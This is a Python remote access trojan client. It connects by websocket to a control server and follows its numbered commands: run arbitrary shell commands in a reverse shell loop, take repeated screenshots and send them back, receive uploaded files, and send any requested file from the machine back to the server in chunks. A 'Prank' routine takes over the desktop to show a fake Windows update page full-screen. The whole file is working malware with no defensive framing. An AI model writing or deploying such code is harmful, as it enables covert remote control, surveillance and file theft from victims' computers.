import asyncio
import websockets
import pyautogui
import time
import os
import pyperclip

# The reverse shell loop function
async def reverse_shell(websocket):
    # Enter a loop to wait for commands from the server and execute them
    while True:
        # Wait for a command from the server
        command = await websocket.recv()
        # If the command is "back", break out of the loop
        if command == "back":
            break
        # Create a subprocess to execute the command and capture the output
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        # Wait for the command to complete and capture the output
        stdout, stderr = await process.communicate()
        # Send the output back to the server
        await websocket.send(stdout)

# A function to take a screenshot and save it to a file
async def screenshot(websocket):
    duration  = await websocket.recv()
    if duration == "back":
        return
    for i in range(int(duration)):
        # Wait 3 seconds
        await asyncio.sleep(3)
        # Take a screenshot
        myScreenshot = pyautogui.screenshot()
        # Generate a unique file name based on the current time
        file_name = 'screenshot_' + str(int(time.time())) + '.png'
        # Save the screenshot to the file
        myScreenshot.save(file_name)
        #Copy the binary contents of the file to a variable
        with open(file_name, "rb") as file:
            contents = file.read()
        # Send the contents of the file back to the server
        await websocket.send(contents)
        os.remove(file_name)

# The main function that handles communication with the server
async def main(websocket):
    # Enter a loop to wait for commands from the server
    while True:
        # Wait for a command from the server
        option = await websocket.recv()
        # If the command is "1" (Reverse Shell), enter the reverse shell loop
        if option == "1":
            await reverse_shell(websocket)
        # If the command is "2" (Take Screenshot), take a screenshot
        elif option == "2":
            await screenshot(websocket)
        # If the command is "3" (Return the screen), return the screen
        elif option == "3":
            await Prank()
        # If the command is "4" (Upload File), upload a file
        elif option == "4":
            await upload_file(websocket)
        # If the command is "5" (Download File), download a file
        elif option == "5":
            await download_file(websocket)
        
async def Prank():
    #Open microsoft edge
    pyautogui.press('win')
    await asyncio.sleep(1)
    pyautogui.typewrite("edge")
    await asyncio.sleep(1)
    pyautogui.press('enter')
    await asyncio.sleep(3)
    pyperclip.copy("fakeupdate.net/win10ue/")
    await asyncio.sleep(1)
    pyautogui.hotkey('ctrl', 'v')
    await asyncio.sleep(1)
    pyautogui.press('enter')
    await asyncio.sleep(1)
    #F11 to go on full screen
    pyautogui.press('f11')
    await asyncio.sleep(1)

async def upload_file(websocket):
    # Create a file to write the contents to
    file_name = str(int(time.time()))
    # Wait for file chunks from the client
    chunk = await websocket.recv()
    if chunk == "back":
        return
    with open(file_name, "wb") as file:
        while chunk != "Done":
            # Write the chunk to the file
            file.write(chunk)
            # Wait for the next chunk
            chunk = await websocket.recv()

async def download_file(websocket):
    # Wait for the file path from the server
    file_path = await websocket.recv()
    if file_path == "back":
        return
    # Try to open the file
    try:
        with open(file_path, "rb") as file:
            file_contents = file.read()
    except FileNotFoundError:
        # If the file doesn't exist, send an error message back to the server
        await websocket.send("File not found")
        return
    except:
        # If an unexpected error occurs, send an error message back to the server
        await websocket.send("Error reading file")
        return
    # Send the file size to the server
    file_size = str(len(file_contents)).encode()
    await websocket.send(file_size)
    # Send the file contents to the server in chunks to avoid running out of memory
    CHUNK_SIZE = 8192
    for i in range(0, len(file_contents), CHUNK_SIZE):
        await websocket.send(file_contents[i:i+CHUNK_SIZE])

# A function to create a WebSocket connection to the server and run the main function
async def run_client():
    # Create the WebSocket connection
    async with websockets.connect("ws://localhost:8765", ping_interval=None, ping_timeout=None) as websocket:
        # Run the main function
        await main(websocket)

# Run the client until it completes
asyncio.get_event_loop().run_until_complete((run_client()))
